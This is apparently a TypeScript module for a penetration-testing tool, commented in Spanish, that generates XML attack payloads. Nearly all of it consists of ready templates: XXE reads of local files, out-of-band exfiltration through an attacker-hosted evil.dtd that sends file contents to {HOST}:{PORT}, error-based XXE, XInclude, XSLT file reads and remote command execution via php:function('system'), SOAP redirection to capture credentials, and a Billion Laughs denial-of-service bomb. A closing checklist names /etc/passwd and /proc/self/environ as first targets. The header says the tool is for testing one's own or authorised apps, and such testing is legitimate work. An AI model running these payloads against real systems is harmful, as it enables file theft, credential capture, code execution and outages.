/* Generador de payloads XML: XXE (lectura de ficheros, OOB con http/FTP),
   XInclude, XSLT, y plantillas XML bien formadas. Para testear apps
   propias o con autorización. */

export interface XmlTemplate {
  id: string
  name: string
  category: 'xxe' | 'xinclude' | 'xslt' | 'oob' | 'util'
  desc: string
  template: string
  needs: ('url' | 'file' | 'host' | 'port')[]
}

export const XML_TEMPLATES: XmlTemplate[] = [
  {
    id: 'xxe-file', name: 'XXE lectura de fichero', category: 'xxe',
    desc: 'el clásico: entidad que se expande al contenido de un fichero local',
    template: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///{FILE}">
]>
<root>
  <data>&xxe;</data>
</root>`,
    needs: ['file'],
  },
  {
    id: 'xxe-wrapsys', name: 'XXE con wrapper PHP (base64)', category: 'xxe',
    desc: 'en PHP, los binarios (png, etc.) corrompen la respuesta: base64 lo soluciona',
    template: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={FILE}">
]>
<root>&xxe;</root>`,
    needs: ['file'],
  },
  {
    id: 'xxe-oob-http', name: 'XXE out-of-band (HTTP)', category: 'oob',
    desc: 'si no ves la respuesta en la app, exfiltra el contenido a tu servidor',
    template: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///{FILE}">
  <!ENTITY % dtd SYSTEM "http://{HOST}:{PORT}/evil.dtd">
  %dtd;
]>
<root>&send;</root>`,
    needs: ['file', 'host', 'port'],
  },
  {
    id: 'xxe-oob-dtd', name: 'el evil.dtd del servidor OOB', category: 'oob',
    desc: 'aloja esto en tu servidor (el que referencia el payload anterior)',
    template: `<!ENTITY % all "<!ENTITY send SYSTEM 'http://{HOST}:{PORT}/?leak=%file;'>">
%all;`,
    needs: ['host', 'port'],
  },
  {
    id: 'xxe-error', name: 'XXE vía error message', category: 'xxe',
    desc: 'cuando no hay respuesta ni OOB: provoca un error que incluya el contenido',
    template: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///{FILE}">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>x</root>`,
    needs: ['file'],
  },
  {
    id: 'xinclude', name: 'XInclude (sin DOCTYPE)', category: 'xinclude',
    desc: 'cuando el parser rechaza DOCTYPE pero acepta el namespace XInclude',
    template: `<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="{FILE}" parse="text"/>
</root>`,
    needs: ['file'],
  },
  {
    id: 'xslt-embed', name: 'XSLT: leer ficheros', category: 'xslt',
    desc: 'si el servidor procesa XSLT (document() es la primitiva de lectura)',
    template: `<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <leak><xsl:value-of select="document('{FILE}')"/></leak>
  </xsl:template>
</xsl:stylesheet>`,
    needs: ['file'],
  },
  {
    id: 'xslt-rce', name: 'XSLT: RCE con extensiones PHP', category: 'xslt',
    desc: 'solo si el motor XSLT tiene extensiones PHP registradas (registrar-php-functions)',
    template: `<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <out><xsl:value-of select="php:function('system', '{CMD}')"/></out>
  </xsl:template>
</xsl:stylesheet>`,
    needs: [],
  },
  {
    id: 'ssrf-soap', name: 'SSRF vía SOAP location', category: 'util',
    desc: 'redirige la petición SOAP a tu servidor para ver cabeceras/credenciales',
    template: `<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsa:To xmlns:wsa="http://www.w3.org/2005/08/addressing">http://{HOST}:{PORT}/catch</wsa:To>
  </soap:Header>
  <soap:Body><ping/></soap:Body>
</soap:Envelope>`,
    needs: ['host', 'port'],
  },
  {
    id: 'billion', name: 'Billion Laughs (bomba de entidades)', category: 'util',
    desc: 'SOLO demo: sirve para comprobar si el parser limita expansiones (NO lo uses: es un DoS)',
    template: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>`,
    needs: [],
  },
]

export const XML_NOTES: string[] = [
  'El XXE se arregla desde 2018 en TODOS los parsers: disable external entities. Si encuentras uno en 2026, es hallazgo serio.',
  'Java sigue siendo el más permisivo (DocumentBuilderFactory sin secure processing): los endpoints SOAP legacy son el mejor coto.',
  'OOB (out-of-band) requiere que el SERVIDOR pueda salir a internet: si está blindado, prueba el método de error message.',
  'XInclude es la vía cuando el DOCTYPE está bloqueado: no necesita declaración de entidades.',
  'En Windows: file:///c:/windows/win.ini es el "hola mundo" que confirma el XXE en 2 segundos.',
]

export const XML_HUNT: [string, string][] = [
  ['¿acepta XML?', 'cambia el Content-Type a application/xml con un XML mínimo: si lo parsea, sigue explorando'],
  ['¿DOCTYPE permitido?', 'manda <!DOCTYPE foo [<!ENTITY x "hola">]><r>&x;</r> → si responde "hola", XXE directo'],
  ['¿hay respuesta?', 'si no la ves, prueba OOB con tu servidor (Burp Collabora­tor o un nc -lp 80 propio)'],
  ['¿qué fichero primero?', 'linux: /etc/passwd · windows: c:/windows/win.ini · java: file:///proc/self/environ'],
]
